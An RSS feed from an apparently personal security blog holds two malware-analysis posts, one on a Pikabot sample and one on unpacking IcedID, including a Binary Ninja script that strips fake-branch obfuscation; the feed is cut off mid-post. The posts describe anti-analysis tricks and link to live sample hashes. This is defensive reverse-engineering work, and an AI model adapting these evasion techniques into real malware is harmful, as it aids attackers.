<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Malware on Kvn11</title><link>https://Kvn11.github.io/categories/malware/</link><description>Recent content in Malware on Kvn11</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Tue, 12 Dec 2023 02:45:01 -0700</lastBuildDate><atom:link href="https://Kvn11.github.io/categories/malware/index.xml" rel="self" type="application/rss+xml"/><item><title>Pikabot malware analysis</title><link>https://Kvn11.github.io/p/pikabot-malware-analysis/</link><pubDate>Tue, 12 Dec 2023 02:45:01 -0700</pubDate><guid>https://Kvn11.github.io/p/pikabot-malware-analysis/</guid><description>&lt;img src="https://Kvn11.github.io/p/pikabot-malware-analysis/img/cover.jpg" alt="Featured image of post Pikabot malware analysis" />&lt;h2 id="sample-info">Sample Info
&lt;/h2>&lt;p>&lt;a class="link" href="https://bazaar.abuse.ch/sample/7e26c4f6f313e5248898a1dbe706ae5b998e12ff16947cb3bfda690ca62612c4/" target="_blank" rel="noopener"
>7e26c4f6f313e5248898a1dbe706ae5b998e12ff16947cb3bfda690ca62612c4&lt;/a>&lt;/p>
&lt;h2 id="initial-analysis">Initial Analysis
&lt;/h2>&lt;p>Based on low number of imports, plus a large and high entropy &lt;code>.rsrc&lt;/code> section, this sample is likely packed.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/pikabot-malware-analysis/img/1.png"
width="1722"
height="979"
srcset="https://Kvn11.github.io/p/pikabot-malware-analysis/img/1_hu13cb723cd146546c5aee643d874fbbe8_325239_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/pikabot-malware-analysis/img/1_hu13cb723cd146546c5aee643d874fbbe8_325239_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt=" Signs of packing "
class="gallery-image"
data-flex-grow="175"
data-flex-basis="422px"
>&lt;/p>
&lt;p>Among the imports are &lt;code>IsDebuggerPresent&lt;/code> and &lt;code>GetTickCount&lt;/code> which could be signs of anti-vm techniques that are present in this sample as well.
There were also a large number of exports, all named after some drawing related functionality.&lt;/p>
&lt;h2 id="loader">Loader
&lt;/h2>&lt;p>In the DLLMain that binja finds, there is a call to &lt;code>DisableThreadLibraryCalls&lt;/code> which is a tactic that increases the invisibility of the DLL.
It will disable the &lt;code>DLL_THREAD_ATTACH&lt;/code> and &lt;code>DLL_THREAD_DETACH&lt;/code> notifications.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/pikabot-malware-analysis/img/3.png"
width="567"
height="523"
srcset="https://Kvn11.github.io/p/pikabot-malware-analysis/img/3_hue805e339c6ee061dc9b0a9b72fa70e31_32772_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/pikabot-malware-analysis/img/3_hue805e339c6ee061dc9b0a9b72fa70e31_32772_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt=" Nothing much here "
class="gallery-image"
data-flex-grow="108"
data-flex-basis="260px"
>&lt;/p>
&lt;p>However, there isn&amp;rsquo;t much more to see within this main function.
Due to the massive amount of exports, and not having access to the delivery method part of the sample, figuring out the function responsible for unpacking is going to be difficult.
However, Pikabot is known to use a lot of anti analysis, so a good place to start would be to look for usage of &lt;code>IsDebuggerPresent&lt;/code>, since the locations in where it appears are likely part of the unpacking process.
And fortunately, it only appears once, making this idea a success.
This gives me a starting point from where I can start unraveling this sample.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/pikabot-malware-analysis/img/2.png"
width="446"
height="349"
srcset="https://Kvn11.github.io/p/pikabot-malware-analysis/img/2_hu2df0f785e6ae0e7160f90aef749e3016_17086_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/pikabot-malware-analysis/img/2_hu2df0f785e6ae0e7160f90aef749e3016_17086_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt=" Turning the table on their anti-anlysis "
class="gallery-image"
data-flex-grow="127"
data-flex-basis="306px"
>&lt;/p>
&lt;p>Unfortunately, following up the call history still results in a lot of options for arriving to this check, so I decide to use process of elimination to start getting rid of some of the exported functions.&lt;/p>
&lt;p>** WORK IN PROGRESS **&lt;/p>
&lt;h2 id="payload">Payload
&lt;/h2>&lt;p>I jumped ahead with &lt;code>unpac.me&lt;/code> to unpack the sample and start looking at the main payload.
Right away, we can see that there is some multiplication of values (maybe a potential key), and data is being copied into some buffers.
There are also references to chrome extensions in some of the strings in this &lt;code>_start&lt;/code> function.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/pikabot-malware-analysis/img/4.png"
width="1402"
height="958"
srcset="https://Kvn11.github.io/p/pikabot-malware-analysis/img/4_hu50483309ffed67801f93d006fe34db24_102461_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/pikabot-malware-analysis/img/4_hu50483309ffed67801f93d006fe34db24_102461_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt=" Pretty straightforward "
class="gallery-image"
data-flex-grow="146"
data-flex-basis="351px"
>&lt;/p>
&lt;p>There does seem to be some level of obfuscation when determining the indices of the arrays by using while loops with 2 conditions, one of them being impossible.&lt;/p></description></item><item><title>IcedID Malware config extraction</title><link>https://Kvn11.github.io/p/icedid-malware-config-extraction/</link><pubDate>Fri, 01 Dec 2023 02:45:01 -0700</pubDate><guid>https://Kvn11.github.io/p/icedid-malware-config-extraction/</guid><description>&lt;img src="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/cover.jpg" alt="Featured image of post IcedID Malware config extraction" />&lt;h2 id="sample-info">Sample Info
&lt;/h2>&lt;p>&lt;a class="link" href="https://bazaar.abuse.ch/sample/0581f0bf260a11a5662d58b99a82ec756c9365613833bce8f102ec1235a7d4f7/" target="_blank" rel="noopener"
>0581f0bf260a11a5662d58b99a82ec756c9365613833bce8f102ec1235a7d4f7&lt;/a>&lt;/p>
&lt;h2 id="initial-analysis">Initial Analysis
&lt;/h2>&lt;p>Based on the few number of imports, and the size of the &lt;code>.data&lt;/code> section, this sample is likely packed.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/1.png"
width="347"
height="216"
srcset="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/1_hu255b867e81cdd1e8e185420027246aaa_3569_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/icedid-malware-config-extraction/img/1_hu255b867e81cdd1e8e185420027246aaa_3569_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="Why so little imports?"
class="gallery-image"
data-flex-grow="160"
data-flex-basis="385px"
> &lt;img src="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/2.png"
width="727"
height="205"
srcset="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/2_hubc1cad610922c751ddb0116b9095aedb_7093_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/icedid-malware-config-extraction/img/2_hubc1cad610922c751ddb0116b9095aedb_7093_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="Sus data"
class="gallery-image"
data-flex-grow="354"
data-flex-basis="851px"
>&lt;/p>
&lt;h2 id="unpacking">Unpacking
&lt;/h2>&lt;p>Unpacking proved to be more difficult than expected.
None of my breakpoints every got reached because my debugger exited before ever reaching the sample&amp;rsquo;s entry point.
Additionally, after &lt;code>x64dbg&lt;/code>&amp;rsquo;s call to &lt;code>LoadLibraryW&lt;/code> to load the sample, I could see that the sample had some memory reserved, but none of it&amp;rsquo;s sections were mapped.
I figured it was probably receiving the wrong reason from the calling process and this was an anti analysis feature.
But then after looking at &lt;code>PE-Bear&lt;/code> a lil more I realized that this &lt;code>DLL&lt;/code> has a number of exports, so I could just use &lt;code>rundll.exe&lt;/code> to call the functions manually and pass this obstacle.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/3.png"
width="485"
height="179"
srcset="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/3_hu708130b302a993688ca264c0cc7d003f_4862_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/icedid-malware-config-extraction/img/3_hu708130b302a993688ca264c0cc7d003f_4862_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="Exported functions from the Dll"
class="gallery-image"
data-flex-grow="270"
data-flex-basis="650px"
>&lt;/p>
&lt;p>After the dll is loaded in &lt;code>x64dbg&lt;/code>, I just set breakpoints on each of the exported functions.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/4.png"
width="1248"
height="150"
srcset="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/4_hu170abdabdf5855104ad8dd7b5693693f_18516_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/icedid-malware-config-extraction/img/4_hu170abdabdf5855104ad8dd7b5693693f_18516_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="Breakpoints"
class="gallery-image"
data-flex-grow="832"
data-flex-basis="1996px"
>&lt;/p>
&lt;p>When continuing, the first breakpoints I hit is the first function I called, &lt;code>DllRegisterServer&lt;/code>.
This function was filled with instructions like &lt;code>cmp al, al; jne&lt;/code> which were interesting because I don&amp;rsquo;t think the jump would ever trigger.
My thought is that this was supposed to be an anti analysis technique.
Also, I quickly realized that debugging without knowing what I was looking for would be confusing and not very fruitful so I went back to binja to do some static analysis.
However, due to the fake branching, the code is a bit convuluted and hard to follow.
I decided to make a script to get rid of them.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;span class="lnt">39
&lt;/span>&lt;span class="lnt">40
&lt;/span>&lt;span class="lnt">41
&lt;/span>&lt;span class="lnt">42
&lt;/span>&lt;span class="lnt">43
&lt;/span>&lt;span class="lnt">44
&lt;/span>&lt;span class="lnt">45
&lt;/span>&lt;span class="lnt">46
&lt;/span>&lt;span class="lnt">47
&lt;/span>&lt;span class="lnt">48
&lt;/span>&lt;span class="lnt">49
&lt;/span>&lt;span class="lnt">50
&lt;/span>&lt;span class="lnt">51
&lt;/span>&lt;span class="lnt">52
&lt;/span>&lt;span class="lnt">53
&lt;/span>&lt;span class="lnt">54
&lt;/span>&lt;span class="lnt">55
&lt;/span>&lt;span class="lnt">56
&lt;/span>&lt;span class="lnt">57
&lt;/span>&lt;span class="lnt">58
&lt;/span>&lt;span class="lnt">59
&lt;/span>&lt;span class="lnt">60
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">is_fake_cmp&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">instr&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">instr&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">tokens&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">text&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s2">&amp;#34;cmp&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">op1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">instr&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">tokens&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">op2&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">instr&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">tokens&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">op1&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">text&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="n">op2&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">text&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="kc">True&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">is_jump&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">instr&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">instr&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">tokens&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">text&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;je&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;jne&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;jz&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;jnz&amp;#34;&lt;/span>&lt;span class="p">]:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="kc">True&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">else&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="kc">False&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">find_fake_jmps&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">basic_block&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">fake_jmps&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">[]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">instructions&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">basic_block&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">get_disassembly_text&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ctr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">while&lt;/span> &lt;span class="n">ctr&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">instructions&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">instr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">instructions&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">ctr&lt;/span>&lt;span class="p">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">is_fake_cmp&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">instr&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">#print(f&amp;#34;[i] Fake cmp @ 0x{instr.address:016X}&amp;#34;)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">next_instr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">instructions&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">ctr&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">is_jump&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">next_instr&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">f&lt;/span>&lt;span class="s2">&amp;#34;[*] FOUND FAKE jump @ 0x&lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">next_instr&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">address&lt;/span>&lt;span class="si">:&lt;/span>&lt;span class="s2">016X&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">fake_jmps&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">append&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">instr&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">next_instr&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ctr&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="mi">1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ctr&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="mi">1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">fake_jmps&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">patch_fake_jmp&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">instr_pair&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">cmp_instr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">instr_pair&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">jmp_instr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">instr_pair&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">jmp_type&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">jmp_instr&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">tokens&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">text&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">jmp_type&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s2">&amp;#34;je&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">bv&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">always_branch&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">jmp_instr&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">address&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">elif&lt;/span> &lt;span class="n">jmp_type&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s2">&amp;#34;jne&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">bv&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">never_branch&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">jmp_instr&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">address&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">elif&lt;/span> &lt;span class="n">jmp_type&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s2">&amp;#34;jz&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">bv&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">always_branch&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">jmp_instr&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">address&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">elif&lt;/span> &lt;span class="n">jmp_type&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s2">&amp;#34;jnz&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">bv&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">never_branch&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">jmp_instr&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">else&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">f&lt;/span>&lt;span class="s2">&amp;#34;[!] Unhandled jmp @ 0x&lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">jmp_instr&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">address&lt;/span>&lt;span class="si">:&lt;/span>&lt;span class="s2">016X&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="kc">False&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">bv&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">convert_to_nop&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">cmp_instr&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">address&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="kc">True&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">remove_fake_branches&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">fn_addr&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">n_patched&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">f&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">bv&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">get_function_at&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">fn_addr&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="n">basic_block&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">f&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">basic_blocks&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">fake_jmps&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">find_fake_jmps&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">basic_block&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="n">fj&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">fake_jmps&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">patch_fake_jmp&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">fj&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">n_patched&lt;/span> &lt;span class="o">+=&lt;/span>&lt;span class="mi">1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">bv&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">begin_undo_actions&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">remove_fake_branches&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x7ffd00e31000&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">bv&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">commit_undo_actions&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Also, from reading this &lt;a class="link" href="https://binary.ninja/2023/11/13/obfuscation-flare-on.html" target="_blank" rel="noopener"
>article&lt;/a> you will need to disable &lt;code>Tail Call Analysis&lt;/code> in whatever tool you are using, otherwise, the psuedo c view will not be as concise as it could be.
And just like that, the control flow becomes so much easier to read.
Ngl, seeing this happen in real time was very satisfying.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/5.png"
width="250"
height="908"
srcset="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/5_hu01f062533f9732c7e45e256f225ddc72_9966_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/icedid-malware-config-extraction/img/5_hu01f062533f9732c7e45e256f225ddc72_9966_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="Before"
class="gallery-image"
data-flex-grow="27"
data-flex-basis="66px"
> &lt;img src="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/6.png"
width="461"
height="729"
srcset="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/6_hu7df3c03cfc00fab6ad101d34e7f33174_3656_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/icedid-malware-config-extraction/img/6_hu7df3c03cfc00fab6ad101d34e7f33174_3656_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="After"
class="gallery-image"
data-flex-grow="63"
data-flex-basis="151px"
>&lt;/p>
&lt;p>If we follow the function calls in this now super flattened function, we end up at what looks to be a function that does some api hashing, and uses stack strings.
I set breakpoints at these calls so I could figure out what api it was grabbing.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/7.png"
width="580"
height="904"
